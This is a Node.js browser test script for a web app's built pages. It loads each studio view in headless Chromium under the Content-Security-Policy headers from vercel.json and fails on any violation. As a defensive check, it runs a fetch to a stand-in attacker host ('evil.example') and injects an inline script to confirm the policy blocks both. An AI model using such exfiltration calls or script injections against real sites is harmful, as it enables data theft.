// Serves dist/ with the exact headers from vercel.json, loads the colony and every studio view,
// and fails on any Content-Security-Policy violation. Also proves the policy blocks exfiltration
// and injected scripts. Run after `npm run build`: node scripts/csp-browser.cjs
const {chromium}=require('./lib/browser-runtime.cjs');
const assert=require('node:assert/strict');
const {createServer}=require('node:http');
const {readFileSync,existsSync,statSync}=require('node:fs');
const {join,extname}=require('node:path');
const root=join(__dirname,'..','dist'),headers=JSON.parse(readFileSync(join(__dirname,'..','vercel.json'),'utf8')).headers[0].headers;
const types={'.html':'text/html','.js':'text/javascript','.css':'text/css','.png':'image/png','.svg':'image/svg+xml','.woff2':'font/woff2','.ttf':'font/ttf','.glb':'model/gltf-binary','.json':'application/json','.jpg':'image/jpeg','.webp':'image/webp','.mp3':'audio/mpeg','.wav':'audio/wav'};
const server=createServer((q,s)=>{const p=decodeURIComponent(new URL(q.url,'http://x').pathname);
 if(p.startsWith('/api/')){s.writeHead(503,{'content-type':'application/json'});return s.end('{"error":"offline"}');}
 let f=join(root,p);if(!f.startsWith(root)||!existsSync(f)||statSync(f).isDirectory())f=join(root,'index.html');
 for(const h of headers)s.setHeader(h.key,h.value);s.setHeader('content-type',types[extname(f)]||'application/octet-stream');s.end(readFileSync(f));});
(async()=>{
 await new Promise(r=>server.listen(4174,'127.0.0.1',r));
 const browser=await chromium.launch({headless:true});
 try{
  for(const [path,ready] of [['/','.burrow-host[data-rats="blender"]'],['/?view=rat-studio','#rat-studio'],['/?view=snake-studio','#snake-status'],['/?view=wheel-studio','#wheel-studio'],['/?view=mating-studio','#mating-studio'],['/?view=gait-studio','#rat-studio']]){
   const p=await browser.newPage();p.setDefaultTimeout(Number(process.env.RATTERY_TIMEOUT||60000));
   await p.addInitScript(()=>{window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.violatedDirective+' '+e.blockedURI));try{localStorage.setItem('rattery:welcome-explainer:v2','done');}catch{}});
   await p.goto('http://127.0.0.1:4174'+path);await p.waitForSelector(ready);await p.waitForTimeout(3000);
   if(path==='/'){await p.locator('.wallet-trigger').click();await p.keyboard.press('Escape');}
   assert.deepEqual(await p.evaluate(()=>window.__csp),[],'CSP violation on '+path);
   if(path==='/?view=snake-studio'){
    const r=await p.evaluate(async()=>{let fetchBlocked=false;try{await fetch('https://evil.example/x');}catch{fetchBlocked=true;}
     const s=document.createElement('script');s.textContent='window.__inline=1';document.body.appendChild(s);return {fetchBlocked,inline:!!window.__inline};});
    assert.deepEqual(r,{fetchBlocked:true,inline:false},'CSP must block exfiltration and injected inline script');
   }
   console.log('PASS csp',path);await p.close();
  }
 }finally{await browser.close();server.close();}
})().catch(e=>{console.error(e);process.exit(1);});
